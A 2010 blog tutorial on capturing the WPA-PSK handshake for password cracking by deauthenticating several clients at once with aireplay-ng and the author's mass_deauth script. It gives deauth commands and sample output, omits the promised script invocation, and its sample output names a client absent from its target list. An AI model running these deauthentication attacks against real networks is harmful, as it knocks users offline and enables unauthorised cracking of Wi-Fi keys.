---
layout: post
title: "Capturing the WPA handshake using mass deauthentication"
date: 2010-12-20 18:10:26 -0400
comments: true
categories: coding howto hacking
alias: /2010/12/capturing-wpa-handshake-using-mass.html
---

Capturing the 4-way handshake required to crack WPA-PSK can be a bit frustrating when you can't get a client to deauthenticate and reauthenticate with the access point. One option is to deauthenticate all the clients by not providing the client's MAC address when running the deauthentication attack:

<!--more-->

```
aireplay-ng -0 1 -a 00:0F:66:XX:XX:XX mon0
```

This is a bit overkill since you might not want to knock out all the clients on the network when performing an audit. The alternative is to target different clients and hope one of them deauthenticates and reauthenticates. This can be time consuming as you'll be picking one client, trying it, then picking another if it doesn't work. 

To solve this problem, I've written a little script that lets you deauthenticate several targeted clients and increases your chances of the deauthentication attack working. 

You can grab the latest version from [GitHub](https://github.com/superkojiman/mass_deauth).

Let's take a look at a sample WPA-PSK network captured by airodump-ng:

```
 CH  6 ][ Elapsed: 11 mins ][ 2010-12-20 14:51
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 
 00:0F:66:XX:XX:XX  -60   4      130     3917    2   6  54   WPA  TKIP   PSK  prime2
 
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes
 
 00:0F:66:XX:XX:XX  00:26:BB:XX:XX:XX  -46   54 -54     51     1716
 00:0F:66:XX:XX:XX  00:13:E8:XX:XX:XX  -46   54 -12     18      219
 00:0F:66:XX:XX:XX  00:1B:77:XX:XX:XX  -47   36 -24      0     1217
 00:0F:66:XX:XX:XX  C4:46:19:XX:XX:XX  -57    1 - 1      1      740
 00:0F:66:XX:XX:XX  00:19:D2:XX:XX:XX  -62    1 - 1      0      223
 00:0F:66:XX:XX:XX  18:E7:F4:XX:XX:XX  -65    1 - 1      0        7
```
 
 Our target access point is called prime2 and it has six clients connected to it. Let's say we want to deauthenticate the last four on that list. The fastest way to do that is to just copy and paste those lines into a file. Call it target_list.txt. It should look like this:

```
 00:0F:66:XX:XX:XX  00:1B:77:XX:XX:XX  -47   36 -24      0     1217
 00:0F:66:XX:XX:XX  C4:46:19:XX:XX:XX  -57    1 - 1      1      740
 00:0F:66:XX:XX:XX  00:19:D2:XX:XX:XX  -62    1 - 1      0      223
 00:0F:66:XX:XX:XX  18:E7:F4:XX:XX:XX  -65    1 - 1      0        7
```

Next, run mass_deauth.sh and pass it target_list.txt:

A quick explanation on what the options mean. 

* -i is the interface we're using. In this case, mon0
* -t is the file containing the clients, target_list.txt
* -a: is the access point's MAC address.
* -n is the number of deauthentication packets to send. If you don't use -n it defaults to 1. In this case, we're going to send 5 deauthentication packets.

Run the command and you should get output similar to the following for each targeted client:

```
Attempting to deauthenticate 90:4C:E5:XX:XX:XX...
Command: aireplay-ng -0 5 -a 00:0F:66:XX:XX:XX -c 90:4C:E5:XX:XX:XX mon0
14:34:15  Waiting for beacon frame (BSSID: 00:0F:66:XX:XX:XX) on channel 6
14:34:16  Sending 64 directed DeAuth. STMAC: [90:4C:E5:XX:XX:XX] [26|45 ACKs]
14:34:16  Sending 64 directed DeAuth. STMAC: [90:4C:E5:XX:XX:XX] [47|42 ACKs]
14:34:17  Sending 64 directed DeAuth. STMAC: [90:4C:E5:XX:XX:XX] [48|43 ACKs]
14:34:17  Sending 64 directed DeAuth. STMAC: [90:4C:E5:XX:XX:XX] [45|37 ACKs]
14:34:18  Sending 64 directed DeAuth. STMAC: [90:4C:E5:XX:XX:XX] [29|50 ACKs]
 
Attempting to deauthenticate C4:46:19:XX:XX:XX...
Command: aireplay-ng -0 5 -a 00:0F:66:XX:XX:XX -c C4:46:19:XX:XX:XX mon0
14:34:24  Waiting for beacon frame (BSSID: 00:0F:66:XX:XX:XX) on channel 6
14:34:25  Sending 64 directed DeAuth. STMAC: [C4:46:19:XX:XX:XX] [ 7|51 ACKs]
.
.
.
```

With any luck, at least one of the clients you targeted should have deauthenticated and reauthenticated, thus allowing you to capture the 4-way handshake. If not, give it another go and maybe increase the number of deauthentication packets sent and see if that helps. 

